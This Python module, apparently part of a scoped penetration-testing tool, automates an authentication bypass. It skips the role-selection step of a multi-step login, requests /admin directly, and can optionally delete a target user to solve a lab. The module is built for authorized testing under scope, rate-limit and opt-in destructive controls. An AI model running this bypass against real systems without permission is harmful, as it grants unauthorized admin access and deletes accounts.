"""
Flawed-login-state-machine flow ("authentication bypass via flawed state machine").

A multi-step login (POST /login -> second step such as /role-selector or an MFA
prompt -> finish) assumes step 1 is always followed by the next step. If the
session's *default* role before the second step is privileged, completing only
step 1 and going straight to the admin interface - never visiting the intermediate
step that would assign the real (lower) role - yields administrative access.

Chain: GET /login (scrape csrf) -> POST credentials (step 1 only, do NOT follow into
the role-selector) -> GET /admin directly -> (opt-in) delete the objective user and
check the solved state.
"""

from __future__ import annotations

import logging
import re

from ..core.scope import Scope, ScopeError
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.login_statemachine")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')


def _csrf(html: str | None) -> str | None:
    m = _CSRF.search(html or "")
    return m.group(1) if m else None


def _find_delete(admin_html: str, target: str) -> str | None:
    m = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', admin_html or "")
    return (m.group(1) + target) if m else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.identities:
        return []
    auth = scope.identities[0].get("auth", {})
    if str(auth.get("type", "")) not in ("form_login", ""):
        return []
    login_url = auth.get("login_url", "/login")
    ufield = auth.get("username_field", "username")
    pfield = auth.get("password_field", "password")
    username = auth.get("username")
    password = auth.get("password")
    if not username or not password:
        return []

    base = scope.authorized_base_urls[0]
    limiter = RateLimiter(scope.rate_limit_per_second)
    try:
        c = ScopedClient(scope, base, role="loginsm", limiter=limiter, transport=transport)
    except ValueError:
        return []

    steps: list[TestStep] = []
    try:
        lg = await c.request("GET", login_url)
        # Step 1 only: submit credentials, then deliberately DO NOT visit the
        # intermediate step (e.g. /role-selector) that would set the real role.
        r = await c.request("POST", login_url, data={
            "csrf": _csrf(lg.text if lg else ""), ufield: username, pfield: password},
            follow_redirects=False)
        steps.append(TestStep(step=1, description=f"login step 1 as '{username}' (skip step 2)",
                              method="POST", path=login_url,
                              actual_status=getattr(r, "status_code", None)))

        adm = await c.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=2, description="access /admin before completing role selection",
                              method="GET", path="/admin", actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            logger.info("login-state-machine: /admin not reachable after step 1 (status=%s)",
                        getattr(adm, "status_code", None))
            return []

        solved = False
        target = scope.objective_delete_user
        if target and scope.allow_destructive:
            delpath = _find_delete(adm.text, target) or f"/admin/delete?username={target}"
            dr = await c.request("GET", delpath, follow_redirects=True, destructive=True)
            home = await c.request("GET", "/", follow_redirects=True)
            solved = bool(home is not None and "is-solved" in (home.text or ""))
            steps.append(TestStep(step=3, description=f"delete user '{target}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))
        elif target:
            logger.info("admin reached; delete '%s' skipped (set allow_destructive to perform it)", target)

        note = ("LAB SOLVED (is-solved)" if solved else
                ("admin access achieved; destructive objective not run" if target else
                 "admin access achieved"))
        verdict = Verdict.CONFIRMED_EXPLOIT if (adm_ok and (solved or not target)) else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="LSM-001",
            vulnerability_class=VulnClass.SEQUENCE_VIOLATION,
            hypothesis=("Flawed login state machine: after login step 1 the session's default "
                        "role is privileged; skipping the second step (role selection) and going "
                        "straight to /admin grants administrative access (authentication bypass)."),
            risk_rating=Severity.HIGH,
            affected_endpoint="GET /admin",
            business_impact="Any user bypasses authentication to gain admin access (incl. deleting users).",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: Authentication bypass via flawed state machine / WSTG-ATHN-09",
        )]
    except ScopeError as exc:
        logger.warning("login-state-machine blocked by scope: %s", exc)
        return []
    finally:
        await c.aclose()
